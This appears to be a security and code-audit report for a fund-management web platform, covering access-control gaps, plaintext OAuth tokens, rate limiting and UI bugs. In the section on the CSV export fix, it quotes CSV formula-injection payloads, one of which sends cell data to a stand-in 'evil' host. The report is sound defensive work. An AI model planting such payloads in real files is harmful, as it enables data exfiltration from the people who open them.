## FIXED ISSUES

### [F-001] Whitelist allowed fields in `updateProfile` server action
- File: [actions/profile.ts:21-31](actions/profile.ts:21)
- Problem: `payload: Record<string, unknown> = { ...updates, updated_at }` spreads the caller's `updates` object verbatim. The TypeScript signature lists only `{ name, job_title, phone, linkedin_url }`, but TS types are erased at runtime — a client invoking the server action with `{ name: 'x', role: 'admin' }` would write `role` into `team_members` for their own row. RLS *probably* permits self-writes on `team_members` (since `handle_new_user_trigger.sql` defaults every signup to `admin`, role escalation by self-write is moot today — but the platform is heading toward role separation, and defence-in-depth at the action layer is the correct posture for a financial tool).
- Fix applied: Replaced the spread with an explicit allowlist that copies `name`, `job_title`, `phone`, `linkedin_url` one field at a time, preserving the `undefined` vs `null` distinction so the previous "set to null to clear" affordance still works. `initials` derivation kept as-is.

### [F-002] Neutralise CSV formula injection on all spreadsheet exports
- File: [lib/csv-export.ts:49-78](lib/csv-export.ts:49)
- Problem: `escapeCSV` handled commas/quotes/newlines correctly but did **not** prefix values whose first character is `=`, `+`, `-`, `@`, TAB, or CR. This is the canonical OWASP CSV injection pattern: a portfolio company named `=cmd|'/c calc'!A0`, or a cap-table holder note containing `=HYPERLINK("https://evil/exfil?q="&A1, "click")`, becomes an *active formula* the moment an LP, board member, or auditor opens `Companies-2026-05-18.csv` or `CapTable-2026-05-18.csv` in Excel. The platform exports companies, cap table, tasks, and contacts — all of which contain free-text fields fed from founders, scraped deal flow, and email-ingested updates. On a fund-grade platform handing out CSVs to LPs this is the most serious silent-attack surface I've seen audit-to-audit.
- Fix applied: `escapeCSV` now prepends a single quote (`'`) to any value whose first character matches `/^[=+\-@\t\r]/`, *before* the existing comma/quote/newline quoting logic. The single-quote is treated by Excel/Google Sheets/Numbers as "this is text, don't parse as formula" and is stripped from the displayed cell value. No call-site change required; every exporter (`exportCompaniesCSV`, `exportCapTableCSV`, `exportTasksCSV`, `exportContactsCSV`) benefits transparently. Header strings are unaffected because they're hardcoded English nouns. Note: this file was *already* uncommitted from prior sessions (per M-013) — this change is additive to that pending diff.

### [F-003] Trim whitespace-only notes to `null` on round & investment forms
- Files: [components/forms/InvestmentForm.tsx:43](components/forms/InvestmentForm.tsx:43), [components/forms/RoundForm.tsx:39](components/forms/RoundForm.tsx:39)
- Problem: The new Notes field shipped in commits `3820a96` / `6ef0f3f` reads the textarea as `(fd.get('notes') as string) || null`. If a user types only whitespace (very common when half-editing then bailing), the value is preserved as a non-empty whitespace string rather than normalised to `null`. The history-tab render at [CompanyDetailClient.tsx ~712-713](app/(protected)/companies/[id]/CompanyDetailClient.tsx:712) is `{round.notes && <p>{round.notes}</p>}` — so whitespace passes the truthy guard and renders as a blank italic paragraph between the round header and the separator, looking like a UI bug to the operator.
- Fix applied: Both forms now read `((fd.get('notes') as string) ?? '').trim() || null`. Empty-string and whitespace-only inputs both normalise to `null`. Pairs cleanly with N-006 below (the column needs a length cap server-side as well, but that's a Medium-severity follow-up since trim handles the visible-bug case today).

## MANUAL ACTION REQUIRED

### [M-014] `team-members` server actions have no auth or role gate — direct self-promotion path
- Severity: **Critical**
- Category: Security
- File: [actions/team-members.ts:14-36](actions/team-members.ts:14)
- Problem: `createTeamMember`, `updateTeamMember`, and `deleteTeamMember` each open a server Supabase client and write to `team_members` with zero in-action checks. There is no `getUser()` call, no `requireAdminAuth()` (which exists in `lib/` per commit `e588dec`), no caller-vs-target identity check, and no field-level guard on `role`. A signed-in user can call `updateTeamMember(otherUserId, { role: 'admin' })` to **promote any teammate**, or `updateTeamMember(myId, { role: 'admin' })` to **promote themselves** if a future migration ever downgrades the default role away from admin. Today's mitigation is purely environmental — `handle_new_user_trigger.sql` makes every signup admin already, so escalation has nothing to escalate *to*. The moment role-split lands (it's on the IMPROVEMENT IDEAS list from prior reports), this becomes immediately exploitable. `deleteTeamMember` is also a one-line denial-of-service: any signed-in user can call `deleteTeamMember(otherUserId)` and remove a teammate from the org if RLS permits the delete.
- Recommended fix: Wrap all three with `requireAdminAuth()` (already exported from `lib/auth.ts` per `e588dec`). Additionally, in `updateTeamMember`, reject payloads where `data.role` is set unless `targetId !== caller.id`. Optionally, narrow the `data` param type to `Pick<TeamMemberData, 'name' | 'color' | 'job_title'>` for self-updates and the full type only for admins. Pairs with M-001 (RLS tightening) — both need to land before any role-split feature work.

### [M-015] Public founder-update endpoint has no rate limit but writes with service role
- Severity: **High**
- Category: Security
- File: [actions/founder-updates.ts](actions/founder-updates.ts) — `submitFounderUpdate`, lines 60-133
- Problem: This is a token-gated public endpoint (founders click an emailed link with a per-company UUID `update_token`) that uses the **service role** Supabase client to bypass RLS and insert into `company_updates` AND `company_kpis`. Length is capped at 5,000 chars per field via `clampText`, but there is no rate limit — a leaked token, a brute-forceable token (UUIDs are 122-bit so practically not, but log leakage / accidental forwarding / a partner mailing list typo all happen), or a malicious/curious founder lets the caller insert unlimited rows into the fund's KPI history. The damage radius is portfolio-wide MOIC / runway chart corruption plus a noisy history feed on the affected company page. The neighbouring public-tokened paths `/api/send-deal-report` and `/api/send-report` already gate with `checkRateLimit` (added in `055cf63 fix(api): harden email routes`), so the helper is present and free to wire up here.
- Recommended fix: Add `checkRateLimit('founder-update:' + data.token, 5, 60_000)` (or stricter) as the first statement after token validation; return a 429-equivalent shape on overflow. Also consider one-shot tokens that rotate after a successful submission, so a leaked link can't be replayed indefinitely.

### [M-016] `task-automations.ts` lets any user edit/delete any rule, and `assign_to` is silently broken
- Severity: **High**
- Category: Security / Bug
- File: [actions/task-automations.ts:39-87, 147-152](actions/task-automations.ts:39)
- Problem: Two issues stacked in one file. **(a)** `updateAutomationRule(ruleId, data)` and `deleteAutomationRule(ruleId)` filter only on `.eq('id', ruleId)` — no `created_by = auth.uid()` guard, no admin check. A signed-in user can edit or delete another user's automation rule. `getAutomationRules()` similarly returns every rule in the table, not just the caller's. **(b)** Line 151 writes `supabase.from('tasks').update({ assignee_id: assigneeId }).eq('id', taskId)`, but a grep of `supabase/migrations/**.sql` for `assignee_id` returns **zero** matches (verified) — the column does not exist on `tasks`. The codebase uses a `task_assignees` join table (`assigned_to`, `assigned_by`, `task_id`). So every time an `assign_to` automation fires, the update silently fails with a "column does not exist" PostgREST error that is dropped on the floor (no `if (error)` handling). The automation feature has been shipped UI-wise (`TaskAutomationRuleForm.tsx`) but the wire is cut.
- Recommended fix: **(a)** Add `getUser()` + `.eq('created_by', user.id)` to both update and delete; have `getAutomationRules()` filter by `created_by` (or, if cross-user visibility is the product intent, add an explicit comment saying so and tighten only the write paths). **(b)** Replace the `tasks.update({ assignee_id })` with an upsert into `task_assignees`: `await supabase.from('task_assignees').upsert({ task_id: taskId, assigned_to: assigneeId, assigned_by: rule.created_by })` (and surface `.error`). Pair with an end-to-end test of the assign-to rule — there's clearly no test, or this would have been caught at PR time.

### [M-017] Microsoft Graph access & refresh tokens stored in plaintext
- Severity: **High**
- Category: Security
- File: [app/api/auth/microsoft/callback/route.ts:85-95](app/api/auth/microsoft/callback/route.ts:85)
- Problem: OAuth `access_token` and `refresh_token` are upserted into `email_integrations` as raw strings. Anyone with read on that row — other team members under today's permissive RLS (see M-001), a leaked service-role key, a misconfigured `pg_dump`, a future Supabase backup misroute — can replay those tokens against Microsoft Graph and read the user's mailbox. Refresh tokens in particular are long-lived (90 days default, often longer with sliding refresh), so the blast radius of a single read is "the entire inbox for the next quarter". This is the most sensitive data the platform stores and it sits at-rest plaintext.
- Recommended fix: Encrypt at rest. Two reasonable paths: (a) app-layer AES-256-GCM with a key in `process.env.EMAIL_TOKEN_KEY` — encrypt before insert, decrypt in `getValidAccessToken`; (b) Postgres-side via `pgcrypto`'s `pgp_sym_encrypt` with the key supplied per-call from the application. (a) is simpler and pairs naturally with the existing server-only handler. Either way, also add a `last_rotated_at` and a 30-day refresh-token rotation job.

- Severity: **Medium**
- Category: UI / Accessibility
- File: [app/(protected)/companies/[id]/CompanyDetailClient.tsx:693, 731, 771](app/(protected)/companies/[id]/CompanyDetailClient.tsx:693), plus the older SAFE buttons at lines 622, 631
- Problem: All hover-revealed edit/delete affordances use `opacity-0 group-hover:opacity-100` with no `group-focus-within:opacity-100`. Tab-navigating the page never reveals them (keyboard users see a focused button they can't see), and touch users on iPad/iPhone never get a hover state — so on those devices the buttons exist but render at zero opacity. This is the affordance shipped in `3546c9d (fix(history): make round edit/delete buttons visible on hover)` and the regression makes the new edit/delete flow unreachable for half the team's input modalities. The CFO/COO who reviews on an iPad cannot edit a round at all.
- Recommended fix: Add `group-focus-within:opacity-100` to each opacity-0 wrapper and `focus-visible:opacity-100` to each button. Better still, gate the hover behaviour on `[@media(hover:hover)]:` so touch devices always see the buttons:
  ```
  className="opacity-100 [@media(hover:hover)]:opacity-0 group-hover:opacity-100 group-focus-within:opacity-100 p-1.5 …"
  ```

### [M-020] `GlobalSearch` has a stale-result race on fast typing
- Severity: **Medium**
- Category: Bug
- File: [components/GlobalSearch.tsx:57-69](components/GlobalSearch.tsx:57)
- Problem: The Cmd-K search component debounces input and fires `fetch('/api/search?q=...')`, but does not abort the in-flight request or version-check the response before calling `setResults`. A slow earlier query (e.g. `menom`) can resolve *after* a faster newer query (e.g. `menomadin`), overwriting the correct results with stale ones. The user clicks what looks like a valid match, lands on the wrong deal — bad UX in the platform's primary navigation surface. The just-uncommitted improvement to `/api/search/route.ts` (per M-013) adds per-category pagination, which makes some queries slower and *worsens* this race.
- Recommended fix: Hold `const abortRef = useRef<AbortController | null>(null)`, abort the previous controller on each keystroke, pass `signal: controller.signal` to fetch, and also keep a `latestQueryRef` for belt-and-braces verification before `setResults`.

## IMPROVEMENT IDEAS

1. **Move all "ungated" server actions through a shared `withAuth` / `withAdminAuth` wrapper.** Today's audit found M-014 (`team-members`), M-015 (`founder-updates` rate limit), and M-016 (`task-automations` cross-user write) in three different files, all stemming from a missing one-liner at the top of each action. The codebase already has `requireAdminAuth` and `checkRateLimit` helpers from commit `e588dec`. Make them mandatory by writing a higher-order wrapper that every server action *must* use to access the Supabase client — then the audit surface for "did the author remember to gate this?" shrinks to grep'ing for raw `createServerSupabaseClient` outside the wrapper file. This single piece of infrastructure would close M-014, M-015, M-016, M-001, **and** prevent every future recurrence by construction.

2. **Add an `assignee_id`-style schema invariant check to CI.** M-016(b) (the broken `assign_to` automation writing to a non-existent column) is the second time this audit cycle has surfaced a SQL/code drift bug (the first being the rounds cascade question in M-011). A lightweight check: at CI time, dump the live schema via `supabase db diff` into a checked-in JSON, then run a Node script that greps for every `from('TABLE').update({ COL: ... })` / `.insert({ COL: ... })` pattern in `actions/**` and `app/api/**` and asserts each `COL` exists on `TABLE`. Catches this class of bug — and would have caught the M-011 cascade-vs-application drift had the schema been checked in.

3. **Encrypt OAuth tokens AND introduce a one-shot founder-update token rotation.** M-017 (plaintext Graph tokens) and M-015 (founder-update token replay) are both "secrets stored as primary key, never rotated" failures. Both can be addressed by a single rotation pattern: store an HMAC of the token + a `rotation_count`, generate a new opaque token on every use, invalidate the old one. Apply to `email_integrations.refresh_token` AND `companies.update_token`. Two-day project, eliminates a whole class of token-leak postmortems.

4. **Land a "destructive action UX kit" before another quarter of inline `window.confirm` accumulation.** Yesterday's IMPROVEMENT IDEA #4 already flagged this — but today's M-018 (hover-only edit/delete buttons) shows the surface is still growing without an established pattern. Bundle: (a) `<ConfirmDestructiveModal>` to replace `window.confirm`, (b) a `<HoverRevealButton>` primitive with built-in focus-visible + touch-device fallback to replace the raw `opacity-0 group-hover:opacity-100` pattern, (c) a `useDeleteAction(action, { successMsg, errorMsg })` hook that wires the toast pattern from `bda0d60`. Replace the existing surfaces in one PR.

5. **CSV export hardening is a 1-week sprint, not just F-002.** Today's auto-fix neutralised formula injection, but the broader CSV surface has more gaps: no UTF-8 BOM (so Excel mis-detects encoding for Hebrew/Arabic company names — a real risk for Menomadin's MENA portfolio); no escaped CR within quoted cells on some browsers; the `formatValue` `JSON.stringify` fallback dumps raw JSON into cells for unexpected object shapes. Spend a week consolidating: add the BOM, add `\r\n` line terminators, replace the `JSON.stringify` fallback with a `'[object]'` placeholder + a warning log, and add a unit test that round-trips known formula-injection vectors. Most of the work pays off via re-use when the PDF/Excel exporters land.
